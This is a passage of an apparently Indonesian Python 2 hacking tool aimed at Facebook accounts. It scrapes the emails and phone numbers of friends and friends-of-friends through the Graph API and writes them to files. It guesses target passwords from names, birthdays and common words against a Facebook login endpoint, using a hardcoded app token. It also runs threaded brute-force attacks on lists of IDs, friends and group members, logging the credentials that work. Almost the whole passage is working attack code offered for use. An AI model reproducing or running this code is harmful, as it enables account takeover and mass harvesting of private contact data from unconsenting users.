				print ("\r\033[1;97m[ \033[1;92m"+str(len(em))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		bz.close()
		print 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSelesai mendapatkan email \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(em))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file diluar folder name\033[1;91m :\033[1;97m ")
		os.rename('out/email_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Terjadi kesalahan saat membuat file"
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] berhenti")
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] Tidak ada koneksi"
		keluar()

##### EMAIL FROM TEMAN #####
def emailfrom_teman():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('reset')
		print logo
		idt = raw_input("\033[1;91m[+] \033[1;92mMasukan ID Teman dari Teman \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;91m[!] ID teman tidak ada"
			raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
			dump()
		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
		a = json.loads(r.text)
		jalan('\033[1;91m[✺] \033[1;92mMendapatkan ID teman dari teman\033[1;97m...')
		print 42*"\033[1;97m═"
		bz = open('out/em_teman_from_teman.txt','w')
		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				emfromteman.append(z['email'])
				bz.write(z['email'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(emfromteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		bz.close()
		print 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSelesai mendaptkan email \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(emfromteman))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file diluar folder nama\033[1;91m :\033[1;97m ")
		os.rename('out/em_teman_from_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Terjadi kesalahan saat membuat file"
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Berhenti")
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] Tidak ada koneksi"
		keluar()
		
##### NOMER #####
def nomor_hp():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('reset')
		print logo
		jalan('\033[1;91m[✺] \033[1;92mMendapatkan semua number phone teman \033[1;97m...')
		print 42*"\033[1;97m═"
		url= "https://graph.facebook.com/me/friends?access_token="+toket
		r =requests.get(url)
		z=json.loads(r.text)
		bz = open('out/nomer_teman.txt','w')
		for n in z["data"]:
			x = requests.get("https://graph.facebook.com/"+n['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				hp.append(z['mobile_phone'])
				bz.write(z['mobile_phone'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(hp))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		bz.close()
		print 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSulesai mendapatkan number \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(hp))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file diluar folder nama\033[1;91m :\033[1;97m ")
		os.rename('out/nomer_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Terjadi kesalahan saat membuat file"
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Berhenti")
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] Tidak ada koneksi"
		keluar()

##### NOMER FROM TEMAN #####
def hpfrom_teman():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('reset')
		print logo
		idt = raw_input("\033[1;91m[+] \033[1;92Masukan ID teman \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;91m[!] ID teman tidak ada"
			raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
			dump()
		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
		a = json.loads(r.text)
		jalan('\033[1;91m[✺] \033[1;92mMendapatkan semua number teman dari teman \033[1;97m...')
		print 42*"\033[1;97m═"
		bz = open('out/no_teman_from_teman.txt','w')
		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				hpfromteman.append(z['mobile_phone'])
				bz.write(z['mobile_phone'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(hpfromteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		bz.close()
		print 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSelesai memdapatkan number \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(hpfromteman))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file diluar folder nama\033[1;91m :\033[1;97m ")
		os.rename('out/no_teman_from_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97maKeluar \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Terjadi kesalahan saat membuat file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Berhenti")
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] Tidak ada koneksi"
		keluar()
    
##### MENU HACK #####
def menu_hack():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
        print "\033[1;94m────────────────────────────────────────────────"
	print "\033[1;92m{\033[1;94m01\033[1;92m}\033[1;93m Mini Hack Facebook(\033[1;92mTarget\033[1;97m)"
	print "\033[1;92m{\033[1;94m02\033[1;92m}\033[1;93m Multi Bruteforce Facebook"
	print "\033[1;92m{\033[1;94m03\033[1;92m}\033[1;93m Super Multi Bruteforce Facebook"
	print "\033[1;92m{\033[1;94m04\033[1;92m}\033[1;93m BruteForce(\033[1;92mTarget\033[1;97m)"
	print "\033[1;92m{\033[1;94m05\033[1;92m}\033[1;93m Yahoo Checker"
	print "\033[1;92m{\033[1;94m00\033[1;92m}\033[1;91m Keluar"
	print "\033[1;94m────────────────────────────────────────────────"
	hack_pilih()
#----pilih
def hack_pilih():
	hack = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
	if hack=="":
		print "\033[1;91m[!] Salah pilih yang bener"
		hack_pilih()
	elif hack =="1":
		mini()
	elif hack =="2":
		crack()
		hasil()
	elif hack =="3":
		super()
	elif hack =="4":
		brute()
	elif hack =="5":
		menu_yahoo()
	elif hack =="0":
		menu()
	else:
		print "\033[1;91m[!]Salah pilih yang bener"
		hack_pilih()
		
##### MINI HF #####
def mini():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	print "\033[1;97m[\033[1;91mINFO\033[1;97m] \033[1;91mAkun target harus berteman\n    dengan akunmu dulu!"
	print 42*"\033[1;97m═"
	try:
		id = raw_input("\033[1;91m[+] \033[1;92mTarget ID \033[1;91m:\033[1;97m ")
		jalan('\033[1;91m[✺] \033[1;92mloading\033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		a = json.loads(r.text)
		print '\033[1;91m[➹] \033[1;92mNama\033[1;97m : '+a['name']
		jalan('\033[1;91m[+] \033[1;92mCheck \033[1;97m...')
		time.sleep(2)
		jalan('\033[1;91m[+] \033[1;92mOpen password \033[1;97m...')
		time.sleep(2)
		print 42*"\033[1;97m═"
		pz1 = a['first_name']+'123'
		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
		y = json.load(data)
		if 'access_token' in y:
			print "\033[1;91m[+] \033[1;92mFound"
			print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;97m     : "+a['name']
			print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
			print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz1
			raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
			menu_hack()
		else:
			if 'www.facebook.com' in y["error_msg"]:
				print "\033[1;91m[+] \033[1;92mFound"
				print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
				print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;97m     : "+a['name']
				print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
				print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz1
				raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
				menu_hack()
			else:
				pz2 = a['first_name'] + '12345'
				data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				y = json.load(data)
				if 'access_token' in y:
					print "\033[1;91m[+] \033[1;92mFound"
					print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
					print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
					print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz2
					raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
					menu_hack()
				else:
					if 'www.facebook.com' in y["error_msg"]:
						print "\033[1;91m[+] \033[1;92mFound"
						print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
						print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
						print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
						print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz2
						raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
						menu_hack()
					else:
						pz3 = a['last_name'] + '123'
						data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
						y = json.load(data)
						if 'access_token' in y:
							print "\033[1;91m[+] \033[1;92mFound"
							print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
							print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
							print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz3
							raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
							menu_hack()
						else:
							if 'www.facebook.com' in y["error_msg"]:
								print "\033[1;91m[+] \033[1;92mFound"
								print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
								print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
								print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
								print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz3
								raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
								menu_hack()
							else:
								lahir = a['birthday']
								pz4 = lahir.replace('/', '')
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								y = json.load(data)
								if 'access_token' in y:
									print "\033[1;91m[+] \033[1;92mFound"
									print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
									print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
									print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz4
									raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
									menu_hack()
								else:
									if 'www.facebook.com' in y["error_msg"]:
										print "\033[1;91m[+] \033[1;92mFound"
										print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
										print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
										print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
										print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz4
										raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
										menu_hack()
									else:
										lahirs = a['birthday']
										gaz = lahirs.replace('/', '')
										pz5 = a['first_name']+gaz
										data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
										y = json.load(data)
										if 'access_token' in y:
											print "\033[1;91m[+] \033[1;92mFound"
											print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
											print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
											print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz5
											raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
											menu_hack()
										else:
											if 'www.facebook.com' in y["error_msg"]:
												print "\033[1;91m[+] \033[1;92mFound"
												print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
												print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
												print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
												print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz5
												raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
												menu_hack()
											else:
												pz6 = "bintang123"
												data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
												y = json.load(data)
												if 'access_token' in y:
													print "\033[1;91m[+] \033[1;92mFound"
													print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
													print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
													print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
													raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
													menu_hack()
												else:
													if 'www.facebook.com' in y["error_msg"]:
														print "\033[1;91m[+] \033[1;92mFound"
														print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
														print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
														print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
														print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
														raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
														menu_hack()
													else:
														pz7 = "sayang123, sayang, bintang, bajingan, someone, anjing, pukimak, playboy, doraemon, bahagia"
														data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
														y = json.load(data)
														if 'access_token' in y:
															print "\033[1;91m[+] \033[1;92mFound"
															print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
															print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
															print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz7
															raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
															menu_hack()
														else:
															if 'www.facebook.com' in y["error_msg"]:
																print "\033[1;91m[+] \033[1;92mFound"
																print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
																print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
																print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
																print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
																raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
																menu_hack()
															else:
																print "\033[1;91m[!] Sorry, failed to open the target password :("
																print "\033[1;91m[!] try it another way."
																raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
																menu_hack()
	except KeyError:
		print "\033[1;91m[!] Terget tidak ada"
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		menu_hack()
										
								
##### Multi Brute Force #####
##### CRACK ####
def crack():
	global idlist,passw,file
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	idlist = raw_input('\033[1;91m[+] \033[1;92mFile ID  \033[1;91m: \033[1;97m')
	passw = raw_input('\033[1;91m[+] \033[1;92mPassword \033[1;91m: \033[1;97m')
	try:
		file = open((idlist), "r")
		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		for x in range(40):
			zedd = threading.Thread(target=scrak, args=())
			zedd.start()
			threads.append(zedd)
		for zedd in threads:
			zedd.join()
	except IOError:
		print ("\033[1;91m[!] File tidak ada")
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		menu_hack()
		
def scrak():
	global berhasil,cekpoint,gagal,back,up
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		buka = open(idlist, "r")
		up = buka.read().split()
		while file:
			username = file.readline().strip()
			url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(username)+"&locale=en_US&password="+(passw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
			data = urllib.urlopen(url)
			mpsh = json.load(data)
			if back == (len(up)):
				break
			if 'access_token' in mpsh:
				bisa = open("out/mbf_ok.txt", "w")
				bisa.write(username+"|"+passw+"\n")
				bisa.close()
				x = requests.get("https://graph.facebook.com/"+username+"?access_token="+mpsh['access_token'])
				z = json.loads(x.text)
				berhasil.append("\033[1;97m[ \033[1;92mOK✓\033[1;97m ] "+username+"|" +passw+" =>"+z['name'])
			elif 'www.facebook.com' in mpsh["error_msg"]:
				cek = open("out/mbf_cp.txt", "w")
				cek.write(username+"|"+passw+"\n")
				cek.close()
				cekpoint.append("\033[1;97m[ \033[1;93mCP✚\033[1;97m ] "+username+"|" +passw)
			else:
				gagal.append(username)
				back +=1
			sys.stdout.write('\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mCrack    \033[1;91m:\033[1;97m '+str(back)+' \033[1;96m>\033[1;97m '+str(len(up))+' =>\033[1;92mLive\033[1;91m:\033[1;96m'+str(len(berhasil))+' \033[1;97m=>\033[1;93mCheck\033[1;91m:\033[1;96m'+str(len(cekpoint)));sys.stdout.flush()
	except IOError:
		print"\n\033[1;91m[!] Sleep"
		time.sleep(0.01)
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] Tidak ada koneksi"
		
def hasil():
	print
	print 42*"\033[1;97m═"
	###Berhasil
	for b in berhasil:
		print(b)
	###CEK
	for c in cekpoint:
		print(c)
	###Gagal
	print 42*"\033[1;97m═"
	print ("\033[31m[x] Failed \033[1;97m--> " + str(len(gagal)))
	keluar()
	
############### SUPER MBF ################
def super():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.0)
		login()
	os.system('reset')
	print logo
	print "\033[1;94m────────────────────────────────────────────────"
	print "\033[1;97m{\033[1;94m01\033[1;97m}\033[1;96m Crack dengan daftar teman"
	print "\033[1;97m{\033[1;94m02\033[1;97m}\033[1;96m Crack dari teman"
	print "\033[1;97m{\033[1;94m03\033[1;97m}\033[1;96m Crack dari member group"
        print "\033[1;97m{\033[1;94m04\033[1;97m}\033[1;96m Crack dari File"
	print "\033[1;97m{\033[1;94m00\033[1;97m}\033[1;91m Keluar"
	print "\033[1;94m────────────────────────────────────────────────"
	pilih_super()

def pilih_super():
	peak = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
	if peak =="":
		print "\033[1;91m[! Salah pilih yang benar"
		pilih_super()
	elif peak =="1":
		os.system('reset')
		print logo
		jalan('\033[1;91m[✺] \033[1;92mDapatkan semua id teman \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('reset')
		print logo
		idt = raw_input("\033[1;91m[+] \033[1;92mMasukan ID teman \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;91m[!] Id teman tidak ada"
			raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
			super()
		jalan('\033[1;91m[✺] \033[1;92mMendapatkan semua ID teman \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('reset')
		print logo
		idg=raw_input('\033[1;91m[+] \033[1;92mMasukan ID group \033[1;91m:\033[1;97m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+toket)
			asw=json.loads(r.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
		except KeyError:
			print"\033[1;91m[!] ID Group tidak ada"
			raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
			super()
		jalan('\033[1;91m[✺] \033[1;92mMendaptkan id member group \033[1;97m...')
		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=9999999999999&access_token='+toket)
		s=json.loads(re.text)
		for p in s['data']:
			id.append(p['id'])
        elif peak == "4":
                os.system('reset')
                print logo
                try:
                        idlist = raw_input('\033[1;91m[+] \033[1;92mFile ID  \033[1;91m: \033[1;97m')
                        for line in open(idlist,'r').readlines():
                                id.append(line.strip())
                except KeyError:
                        print '\033[1;91m[!] File tidak ada'
                        raw_input('\n\033[1;91m[ \033[1;97mKeluae \033[1;91m]')
                        super()
	elif peak =="0":
		menu_hack()
	else:
		print "\033[1;91m[!] Salah pilih yang benar"
		pilih_super()
		
        print "\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
        jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
        print 42*"\033[1;97m═"
	
			
	##### crack #####
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			#Pass1
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass1+" =>"+z['name'])
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					cek = open("out/super_cp.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					#Pass2
					pass2 = b['first_name']+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
						z = json.loads(x.text)
						print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass2+" =>"+z['name'])
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							cek = open("out/super_cp.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							#Pass3
							pass3 = b['last_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
								z = json.loads(x.text)
								print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass3+" =>"+z['name'])
								oks.append(user+pass3)
							else:
